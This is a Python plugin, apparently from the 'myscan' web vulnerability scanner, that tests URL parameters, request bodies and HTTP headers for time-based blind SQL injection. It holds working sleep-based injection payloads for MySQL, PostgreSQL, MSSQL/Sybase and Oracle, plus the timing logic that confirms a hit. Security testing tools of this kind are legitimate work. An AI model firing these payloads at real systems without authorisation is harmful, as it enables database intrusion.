# !/usr/bin/env python3
# @Time    : 2020-04-07
# @Author  : caicai
# @File    : myscan_sqli_timeblind.py


'''
可测试mysql,mssql/sybase,oracle,postgresql几种数据库，考虑到如果使用delayed方式去探测，将会
发送你大量的数据包去建设模型匹配，数据包成本太大，目前不支持db2等其他数据库。
payloads 均为and注入，所以爬虫如果输入错误的值，可能不会出结果。
'''

import re
import random
import string
from myscan.lib.parse.dictdata_parser import dictdata_parser  # 写了一些操作dictdata的方法的类
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.core.const import notAcceptedExt
from myscan.lib.core.threads import mythread
from myscan.lib.core.common import getmd5, getredis
from myscan.lib.core.data import cmd_line_options, logger
from myscan.config import plugin_set
import copy


class POC():
    def __init__(self, workdata):
        self.verify_count = 2  # 验证次数
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "sqli_time_blind "
        self.vulmsg = "sql 时间盲注"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.sleeptime = 5
        self.max_out = 1
        self.injectstatus = False
        self.found = []
        self.found_headers = []
        self.count_time = []
        self.payloads_digit = []
        self.payloads_alpha = []
        self.payloads = [
            {"payload": "AND SLEEP([SLEEPTIME])", "dbms": "mysql", "comment": ""},
            {"payload": "AND SLEEP([SLEEPTIME])", "dbms": "mysql", "comment": "--"},
            {"payload": "AND [RANDNUM1]=(SELECT [RANDNUM1] FROM PG_SLEEP([SLEEPTIME]))",
             "dbms": "postgresql", "comment": ""},
            {"payload": "AND [RANDNUM1]=(SELECT [RANDNUM1] FROM PG_SLEEP([SLEEPTIME]))",
             "dbms": "postgresql", "comment": "--"},
            {"payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'", "dbms": "mssql or Sybase", "comment": ""},
            {"payload": "WAITFOR DELAY '0:0:[SLEEPTIME]'", "dbms": "mssql or Sybase", "comment": "--"},
            {"payload": "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),[SLEEPTIME])",
             "dbms": "oracle", "comment": ""},
            {
                "payload": "AND 3437=DBMS_PIPE.RECEIVE_MESSAGE(CHR(100)||CHR(119)||CHR(112)||CHR(71),[SLEEPTIME])",
                "dbms": "oracle", "comment": "--"},
        ]
        self.boundaries = [
            {"symbol": "", "pre": " ", "suf": " ", "level": 0},
            {"symbol": "'", "pre": "'", "suf": "'", "level": 0},
            {"symbol": '"', "pre": '"', "suf": '"', "level": 0},
            {"symbol": "", "pre": ")", "suf": "(", "level": 1},
            {"symbol": "'", "pre": "')", "suf": "('", "level": 1},
            {"symbol": '"', "pre": '")', "suf": '("', "level": 1},
        ]
        self.generatepayloads()

    def verify(self):
        if self.dictdata.get("url").get("extension").lower() in notAcceptedExt:
            return
        self.parser = dictdata_parser(self.dictdata)
        # args inject
        params = self.dictdata.get("request").get("params").get("params_url") + \
                 self.dictdata.get("request").get("params").get("params_body")

        if params:
            for param in params:
                self.param = param
                self.injectstatus = False
                payloads = copy.deepcopy(self.payloads_alpha) + copy.deepcopy(self.payloads_digit)

                mythread(self.args_inject, payloads, cmd_line_options.threads)

        # header inject
        if not plugin_set.get("sqli").get("header_inject"):
            return
        header_msg = {
            "User-Agent": {"msg": "sqli_timeblind_ua",
                           "default": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36"},
            "Referer": {"msg": "sqli_timeblind_referer", "default": "https://www.qq.com/search"},
            "X-Forwarded-For": {"msg": "sqli_timeblind_xff", "default": "12.40.9.144"},
            "Real-Ip": {"msg": "sqli_timeblind_ri", "default": "2.40.9.144"},
            "X-Forwarded-Host": {"msg": "sqli_timeblind_xfh", "default": "2.40.9.144"},
        }
        reqs = []
        payloads = copy.deepcopy(self.payloads_alpha)
        for k, v in header_msg.items():
            if self.output(v.get("msg")):
                logger.debug("start timeblind {} inject ".format(k))
                headers = copy.deepcopy(self.dictdata.get("request").get("headers"))
                if k not in headers.keys():
                    headers[k] = v.get("default")
                for test_payload in payloads:
                    reqs.append((headers, k, v, test_payload))
                # for test in payloads:
                #     headers_withpayload = copy.deepcopy(headers)
                #     reqs.append()
                # headers_withpayload[k] = headers_withpayload[k] + payload if method == "a" else payload
                # req =self.parser.generaterequest({"headers": headers_withpayload})
                # reqs.append((req, (payload, search_str, k, v.get("msg"))))
        mythread(self.headers_inject, reqs, cmd_line_options.threads)

    def headers_inject(self, data):
        headers, k, v, test_payload = data
        if k in self.found_headers:
            return
        payload, test = test_payload
        flag_count = 0
        time_1 = time_0 = time_2 = 0
        for test_count in range(self.verify_count):
            time_1 = self.getreqtime_from_header(headers, k, test_payload, self.sleeptime)
            if time_1 > self.sleeptime:
                time_0 = self.getreqtime_from_header(headers, k, test_payload, 0)
                if time_1 > time_0 and time_0 > 0:
                    time_2 = self.getreqtime_from_header(headers, k, test_payload, self.sleeptime * 2)
                    if time_2 > time_1 and time_2 > self.sleeptime * 2:
                        flag_count += test_count
                        continue
            break
        if flag_count == sum(range(self.verify_count)):
            if k not in self.found_headers:
                self.output(v.get("msg"), True)
                self.found_headers.append(k)
                others = "sleep/response time : {}s>>{}s {}s>>{}s {}s>>{}s".format(self.sleeptime * 2, time_2,
                                                                                   self.sleeptime, time_1, 0, time_0)

                self.result.append({
                    "name": self.name,
                    "url": self.parser.getfilepath(),
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "param": "header's {}".format(k),
                        "dbms": test.get("dbms"),
                        "payload": payload,
                        "sleeptime": others,
                        'request': self.parser.getrequestraw(),
                        "response": self.parser.getresponseraw()
                    }
                })

    def getreqtime_from_header(self, headers, k, test_payload, sleeptime):
        if k in self.found_headers:
            return -1
        payload, test = test_payload
        headers_ = copy.deepcopy(headers)
        headers_[k] = headers_[k] + payload.replace("[SLEEPTIME]", str(sleeptime))
        req = self.parser.generaterequest({"headers": headers_})
        r = request(**req)
        if r is not None:
            elapsed_sleeptime = r.elapsed.total_seconds()
            if test.get("dbms") == "mysql":
                elapsed_sleeptime += 0.05  # pathed
            return elapsed_sleeptime
        return 0

    def args_inject(self, test_payload):
        if self.injectstatus:
            return
        flag_count = 0
        payload, test = test_payload
        time_1 = time_0 = time_2 = 0
        for test_count in range(self.verify_count):
            time_1 = self.get_req_time(payload, self.sleeptime, test)
            if time_1 > self.sleeptime:
                time_0 = self.get_req_time(payload, 0, test)
                if time_1 > time_0 and time_0 > 0:
                    # #方法一，快，但是可能误报
                    # flag_count += test_count
                    # continue
                    # 方法二，比较准确，但是耗时
                    time_2 = self.get_req_time(payload, self.sleeptime * 2, test)
                    if time_2 > time_1 and time_2 > self.sleeptime * 2:
                        flag_count += test_count
                        continue
            break

        if flag_count == sum(range(self.verify_count)):
            if not self.injectstatus:
                self.injectstatus = True
                others = "sleep/response time : {}s>>{}s {}s>>{}s {}s>>{}s".format(self.sleeptime * 2, time_2,
                                                                                   self.sleeptime, time_1, 0, time_0)
                # others = "sleep/response time : {}s>>{}s {}s>>{}s".format(self.sleeptime, time_1, 0, time_0)
                self.save(test, payload, others)

    def save(self, test, payload, others):
        self.result.append({
            "name": self.name,
            "url": self.parser.getfilepath(),
            "level": self.level,  # 0:Low  1:Medium 2:High
            "detail": {
                "vulmsg": self.vulmsg,
                "param": self.param.get("name"),
                "dbms": test.get("dbms"),
                "payload": payload,
                "sleeptime": others,
                'request': self.parser.getrequestraw(),
                "response": self.parser.getresponseraw()
            }
        })

    def generatepayloads(self):
        for bound in self.boundaries:
            if bound.get("level") > plugin_set.get("sqli").get("level", 0):
                continue
            for payload in self.payloads:
                if bound.get("pre") != "" and payload.get("comment") == "":
                    if bound.get("symbol") in ["'", '"']:
                        expression = "{pre} {payload} AND {suf}[RANDSTR9]{symbol}={symbol}[RANDSTR9]".format(**bound,
                                                                                                             **payload)
                    else:
                        expression = "{pre} {payload} AND {suf}[RANDNUM9]=[RANDNUM9]".format(**bound, **payload)
                    self.payloads_alpha.append((self.formatpayload(expression), payload))
                else:
                    if payload.get("comment") != "":
                        if bound.get("pre") != "":
                            expression = "{pre} {payload}{comment} [RANDSTR9]".format(**bound, **payload)
                        else:
                            expression = "{pre}{payload}{comment} [RANDSTR9]".format(**bound, **payload)
                    else:
                        if bound.get("pre") != "":
                            expression = "{pre} {payload}".format(**bound, **payload)
                        else:
                            expression = "{pre}{payload}".format(**bound, **payload)

                    self.payloads_digit.append((self.formatpayload(expression), payload))

    def formatpayload(self, expression):
        for _ in set(re.findall(r"(?i)\[RANDNUM(?:\d+)?\]", expression)):
            expression = expression.replace(_, str(self.randomInt()))

        for _ in set(re.findall(r"(?i)\[RANDSTR(?:\d+)?\]", expression)):
            expression = expression.replace(_, self.randomStr())
        return expression

    def randomInt(self, length=4):
        choice = random.choice
        return int(
            "".join(choice(string.digits if _ != 0 else string.digits.replace('0', '')) for _ in range(0, length)))

    def randomStr(self, length=4, lowercase=False, alphabet=None):
        choice = random.choice
        if alphabet:
            retVal = "".join(choice(alphabet) for _ in range(0, length))
        elif lowercase:
            retVal = "".join(choice(string.ascii_lowercase) for _ in range(0, length))
        else:
            retVal = "".join(choice(string.ascii_letters) for _ in range(0, length))

        return retVal

    def get_req_time(self, payload, sleeptime, test):
        if self.injectstatus:
            return -1
        payload_time = payload.replace("[SLEEPTIME]", str(sleeptime))
        req = self.parser.getreqfromparam(self.param, "a", payload_time)
        req["timeout"] = sleeptime * 4
        r = request(**req)
        if r is not None:
            elapsed_sleeptime = r.elapsed.total_seconds()
            if test.get("dbms") == "mysql":
                elapsed_sleeptime += 0.05  # pathed
            return elapsed_sleeptime
        return 0

    def output(self, msg, insert=False):
        msg = "/".join(self.dictdata.get("url").get("url").split("/")[:3]) + " " + msg
        msgmd5 = getmd5(msg)[10:18]
        red = getredis()
        if insert == False:
            if not red.sismember("myscan_max_output", msgmd5):
                return True  # 可以输出
            else:
                logger.debug("sql timeblind moudle : {} 输出个数已达{}上限，不再测试输出".format(msg, self.verify_count))
                return False  # 不可以继续输出
        else:
            # red.hincrby("myscan_max_output", msgmd5, amount=1)
            red.sadd("myscan_max_output", msgmd5)

        # if insert == False:
        #     count = red.hget("myscan_max_output", msgmd5)
        #     if count is None:
        #         return True  # 可以输出
        #     # print("maxout type :{} value:{}".format(type(self.max_out), self.max_out))
        #     #
        #     # print("count type :{} value:{}".format(type(int(count.decode())), int(count.decode())))
        #     if self.max_out > int(count.decode()):
        #         return True  # 可以输出
        #     else:
        #         logger.debug("sql error moudle : {} 输出个数已达{}上限，不再测试输出".format(msg, self.max_out))
        #         return False  # 不可以继续输出
        # else:
        #     red.hincrby("myscan_max_output", msgmd5, amount=1)
